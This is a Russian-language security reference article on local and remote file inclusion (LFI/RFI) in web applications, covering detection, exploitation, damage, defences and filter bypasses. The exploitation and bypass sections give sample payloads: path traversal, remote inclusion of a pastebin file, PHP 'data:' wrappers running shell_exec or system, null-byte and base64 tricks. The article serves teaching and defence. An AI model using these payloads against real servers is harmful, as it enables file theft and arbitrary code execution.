

# уязвимость/атака

## Описание
Атака представляет из себя передачу неправильного имени файла в качестве параметра запроса. Она эксплуатирует недостаток валидации имен файлов, передаваемых в качестве параметра. Данная атака позволяет чтение/выполнение произвольного файла от имени сервера.


## Классификация
- **LFI (Local File Inclusion)** - чтение локального файла на сервере
- **RFI (Remote File Inclusion)** - исполнение удаленного файла или кода

## Условия
- ОС: любая
- Сервер: чтение файлов - любой, исполнение - позволяющий интерпретирование кода на лету.
- В коде есть функции включения/исполнения (`include` в php, `render` в ruby on rails, и т.д.) или возврат пользователю файла, имя которого передается в запросе.

## Детектирование
- Для выявления необходимо исследовать места, где в качестве параметров запроса имена файлов или конструкции, похожие на имена файлов.
-  Первым шагом является подстановка в качестве параметра имена фалов, часто встречающихся на серверах.
- Подставляются прямые ссылки на файлы и имен файлов без расширения.
- Проверяются особые протоколы сервера, например `data:` php.

## Эксплуатация
Пример уязвимого эндпоинта: `http://vulnerable?page=first`. В коде сервера встречается конструкция `include ($_GET['page'])`
1) При передаче параметра `first` будет выполнен код `include (first)`. Если файл содержит код на php он будет выполнен.
2) Есть возможность передать произвольное имя файла, не обязательно предназначенного для вывода пользователю.
3) При передаче параметра вида `page=../../../../../dir/file` есть возможность выхода за пределы стандартного каталога.
4) Есть возможность читать не только локальные, но и файлы из сети. Например при передаче `page=https://pastebin.com/raw/CzHLDP7F` (в данном файле содержится код `<?php phpinfo(); ?>`) будет выведена информация о сервере.
5) Можем передать код для исполнения напрямую, используя параметр вида `page=data:,<?php some_code ?>`
6) Исполнение shell-команды: `page=data:,<?php shell_exec(command) ?>`/`page=data:,<?php system(command) ?>` или аналогичный код в удаленном файле.

### Инструменты
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Ущерб
Возможна следующая эксплуатация данной уязвимости:
- Чтение файлов не предназначенных для чтения сторонними людьми (файлы конфигурации, логи сервера, исходный код продукта).
- Кража баз данных, если они находятся на той же машине.
- Возможность применения XSS.
- Выполнение произвольного кода на сервере.

## Защита
### Основные меры
- Исключение включения файлов, имена которых получены от пользователя.
- Фильтрация имен файлов по белому списку.

### Превентивные меры
- Фильтрация передаваемых имена файлов, так чтобы они могли находиться только в определенной локальной директории.
- Минимально необходимые права для пользователей веб-приложений.
- Запрет включения удаленных файлов и использования оберток php.

## Дополнительно
[https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752.html](https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752.html)

## Обход защиты
- Передача `%00` в конце параметра для отброса приписываемого окончания.
- Использование `data:;base64,base64_encoded_code` или аналогичной функциональности для обхода фильтров.
- Использование обрезания длинных имен [(информация)](https://xakep.ru/2009/09/17/49508/).
- Использование специальных файлов (/proc, con).
- Использование ошибок поиска файлов и коротких имен DOS. [(информация)](https://xakep.ru/2011/07/03/55787/).